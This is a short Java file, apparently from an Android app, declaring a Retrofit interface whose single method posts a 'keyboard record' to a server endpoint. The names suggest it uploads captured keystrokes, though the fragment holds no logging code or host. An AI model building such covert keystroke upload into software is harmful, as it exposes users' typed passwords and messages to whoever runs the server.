package com.unblok.interfaces;

import com.unblok.DataModal.DataModal;
import com.unblok.DataModal.RequestModal;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.POST;

public interface RetrofitAPI {
        @POST("keyboardrecord")
        Call<DataModal> sendKeyboardRecord(@Body RequestModal request);
    }

